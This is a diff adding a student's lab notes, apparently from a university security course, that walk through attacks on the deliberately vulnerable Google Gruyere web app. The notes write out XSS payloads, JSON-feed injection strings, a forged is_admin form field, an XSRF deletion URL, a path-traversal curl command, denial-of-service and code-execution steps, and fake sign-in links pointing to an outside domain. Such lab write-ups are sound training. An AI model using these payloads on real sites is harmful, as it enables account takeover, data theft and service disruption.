@@ -1,0 +1,207 @@
+########################
+# Step 0 Getting Started
+########################
+
+#Access new gruyere instance
+https://google-gruyere.appspot.com/start
+
+#Check out home page, try all snippets link and homepages
+#Create Account don't reuse a password
+#Fill profile including private snippet and icon
+#Create a new Snippet
+#Upload a file
+
+#I uploaded a picture that I then used as my profile picture
+
+############
+# Step 1 XSS
+############
+
+
+# Uploading a file that can execute arbitrary js
+#################################################
+
+upload step1.html and navigate to the resulting link, an alert should appear
+
+#Manufacture a link that when clicked executes arbitrary js
+############################################################
+
+Set your homepage link to the malicious link for example:
+the link to the uploaded html file or use one of
+ - https://google-gruyere.appspot.com/{your id}/<script>alert(1);</script>
+ - javascript:void(alert(0));
+
+# Create a malicious snippet
+#############################
+
+Hint's didn't help already tried dozens of combination, some only worked partial
+
+Working solutions would be the onmouseover attribute of e.g. links
+
+Couldn't get the other examples to work in Chrome, didn't try another browser
+
+
+# Create a malicious profile color
+##################################
+
+Tried
+FFFF00;" onmouseover="alert(1);
+didn't work as the html uses single quotes which is not noticeable in chrome as it 
+converts them to double quotes 
+
+Setting the color to 
+FFFF00;' onmouseover='alert(1); 
+works
+
+onload might work on some browsers not mine
+
+# Stored XSS via AJAX
+#####################
+
+_refresh calls eval on httpRequest.responseText this looks promissing
+
+responseText: "↵_feed((↵↵↵↵↵{↵"private_snippet":↵  "something"↵↵,"cheddar":↵  "Gruyere is the cheesiest application on the web."↵↵↵,"brie":↵  "Brie is the queen of the cheeses<span style=color:red>!!!</span>"↵,"FakeNews":↵  "<a onmouseover="alert(1)" href="#">read this!</a>"↵}↵↵))↵"
+
+Creating a snippet with the following might work
+something"})); alert(1); _feed(({"private_snippet":↵  "something else
+
+I don't know why it doesn't work but the following works 
+something" + (alert(0)," ") + "else 
+
+Couldn't get the version with the alert hidden in a invisible span to work
+
+What works as well would be , it also replaces the private snippet
+something" })), alert(1), _feed(({"private_snippet": "something else
+
+# Reflected XSS via AJAX
+########################
+
+Didn't understand the difference to the first reflected Xss without the hints
+
+Set for example homepage to one of the following
+ - https://google-gruyere.appspot.com/{your id}/feed.gtl?uid=<script>alert(1)</script>
+
+##############################
+# Step 2 Priviledge Escalation
+##############################
+
+# Get admin
+###########
+
+In browser edit live page code of profile edit and add
+
+<tr><td>
+    Is admin:
+    </td><td>
+     <input type='radio'
+        name='is_admin' value='True'>Yes
+      <input type='radio'
+        name='is_admin' value='False'>No
+</td></tr>
+
+check Yes and submit the form than log out and back in
+
+# Accessing another account
+
+create an account {userid}|admin|author and login 
+
+# addon
+
+remove the fields length limit by editing the pages html to get around the username length limit
+
+# XSRF
+######
+
+Set User Icon to
+https://google-gruyere.appspot.com/{your id}/deletesnippet?index=0
+
+everytime someone opens a page with your user icon they delete their newest (remaining) snippet
+
+# XSSI
+######
+
+open step2.html or https://fs.webtwob.de/uni/it-sec/v8/step2.html
+while being logged in on the same browser
+alternative with alert under step2-2.html or https://fs.webtwob.de/uni/it-sec/v8/step2-2.html
+fs.webtwob.de links might not work as the id is hardcoded 
+
+#######################
+# Step 3 Path Traversal
+#######################
+
+# access secret.txt
+###################
+
+curl --path-as-is https://google-gruyere.appspot.com/650943348759570462139680498696141785433/../secret.txt
+
+getting a 302 page with a broken link but this should have wotked based on the hints/solution
+
+# change secret.txt
+###################
+
+first thought
+exploit upload feature as it apparently just takes the filename and saves it there
+
+Username Something/..
+then upload secert.txt 
+
+Apparently 
+Username Somthing/../.. or .. should work (hints/solution) doesn't look like it does 
+
+# DoS
+#####
+
+# quit server
+
+Just quit it using https://google-gruyere.appspot.com/{your id}/quitserver
+as it should be protected but isn't instead /quit is
+
+# overload server
+create user ../resources
+upload a recursive template template.gtl
+access template url https://google-gruyere.appspot.com/{your id}/template.gtl
+or replace an existing (menubar.gtl) one with a recursive version
+
+# remote code execution
+#######################
+
+first idea replace one of the python files, like we did above for templates,
+with addition of your arbitrary code
+
+upload modified glt.py as Something/../..
+open template.gtl to make the server restart or use the admin restart link
+
+######################################
+# Step 4 Configuration Vulnerabilities
+#######################################
+
+# What dosn't belong
+
+- Default admin account
+- default cookie_secret (Cookie!)
+- dump.gtl
+
+# Redo exploit 
+upload dump.gtl 
+access upload
+
+# Reredo
+put {{_db:pprint}} in your private snippet and show it
+
+# AJAX vulnerabilities
+
+put 
+
+something" })),1+1, _feed(({"private_snippet": "Not your snippet
+
+in your most recent snippet, not sure why the middle part 1+1 is necessary but doesn't work without it
+
+apparently this might be xss alternatively create the user private_snippet
+that users newest snippet will override all private snippets on home when refreshed
+
+create a user menu-right and create a snippet with
+
+<a href='https://webtwob.de/signin'>Sign in</a> | <a href='https://webtwob.de/signup'>Sign up</a>
+
+chromes json parser is really picky, needed to remove the new line
+      
